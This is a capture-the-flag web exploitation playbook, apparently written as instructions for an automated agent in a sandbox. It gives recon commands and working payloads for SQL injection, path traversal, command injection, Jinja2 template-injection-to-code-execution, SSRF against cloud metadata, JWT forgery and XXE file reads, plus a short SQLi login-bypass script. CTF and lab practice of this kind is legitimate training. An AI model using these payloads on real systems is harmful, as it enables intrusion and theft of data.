# Web Exploitation Playbook

**Goal:** reach the flag through an app flaw — read a file, dump a DB value,
reach an admin-only page, or pivot to an internal service. **Persist session
state in files** (`curl -c jar -b jar`): the sandbox filesystem survives between
commands even though shell variables and cwd do not.

## 1. MAP the surface

```bash
curl -s -i http://TARGET:PORT/                 # headers, Set-Cookie, framework, redirects
curl -s http://TARGET:PORT/robots.txt
curl -s http://TARGET:PORT/sitemap.xml
curl -s -i http://TARGET:PORT/.git/HEAD        # exposed? -> git-dumper for source
whatweb -a 3 http://TARGET:PORT
ffuf -u http://TARGET:PORT/FUZZ -w /usr/share/wordlists/common.txt \
     -mc 200,204,301,302,307,401,403 -t 40 -s
```

Read the served HTML + inline/linked JS: endpoints, API routes, parameter names,
client-side checks, comments, framework tells. Record **every input**:
query params, body fields, headers, cookies, path segments. Discover hidden
params with `arjun`.

## 2. TEST each input (ordered by likelihood)

Pick first by stack: PHP → LFI/RCE; Node/templating → SSTI/prototype pollution;
Java → deserialization/SSTI; anything with `?id=`/search → SQLi.

- **SQL injection** — `'`, `' OR '1'='1`, `UNION SELECT`, time-based `SLEEP(5)`.
  Confirm/exploit with sqlmap (save the request: `-r req.txt`), then `--dump` or
  `--file-read=/flag`.
- **IDOR / broken access control** — increment/replace object IDs, swap your
  token for another user's resource, access `/admin` with a forged role.
- **LFI / path traversal** — `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`,
  log poisoning → RCE. Try common flag paths: `/flag`, `/flag.txt`, `/root/flag`.
- **Command injection** — `; id`, `| id`, `$(id)`, `` `id` ``, newline injection.
  Automate with commix. Blind → time/OOB.
- **SSTI** — probe `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`; identify engine; escalate
  to RCE (Jinja2 `{{ cycler.__init__.__globals__.os.popen('id').read() }}`).
- **SSRF** — point a URL param at `http://127.0.0.1`, `http://169.254.169.254/`
  (cloud metadata), internal hostnames. Chain to reach an internal flag service.
- **Auth / JWT** — `jwt_tool`: `alg:none`, crack weak HMAC secret
  (`-C -d rockyou.txt`), RS256→HS256 key confusion, `kid` path/SQL injection.
  Also default creds, mass-assignment, password-reset logic, OAuth flaws.
- **XSS** — reflected/stored/DOM; relevant when a bot/admin visits (steal
  cookie/flag). Verify with dalfox.
- **XXE** — XML inputs: external entity to read files (`file:///flag`) or SSRF.
- **Deserialization** — PHP `O:`/`unserialize`, Python pickle, Java (ysoserial
  gadget), Node. Leads to RCE.
- **Prototype pollution / NoSQL injection** (`{"$ne":null}`), **GraphQL**
  introspection + overreach, **race conditions** (parallel requests).

## 3. EXPLOIT → flag

Chain the confirmed finding to the objective. Common finishes:
- SQLi → `UNION SELECT flag FROM ...` / `--dump` / `--file-read`.
- LFI/RCE → `cat /flag*`, read app source for a hardcoded flag/secret.
- SSRF → request the internal endpoint that returns the flag.
- Auth bypass/IDOR → fetch the admin/other-user resource holding the flag.
- Exposed `.git` → `git-dumper` then grep source for the flag or logic to bypass.

## Scripting multi-step exploits

```python
import requests
s = requests.Session()
s.post("http://T/login", data={"u":"admin","p":"x' OR '1'='1"})
r = s.get("http://T/admin/flag")
print(r.text)
```

## When stuck

Re-map: did ffuf miss a path (try the larger wordlist, extensions `-e .php,.bak`)?
Look at *response differences* (length/status/timing) for blind bugs. Re-read any
recovered source. If the flag needs a client-side victim (XSS/CSRF) confirm
whether a bot visits. Report missing tools (sqlmap/ffuf/nuclei) as env gaps.
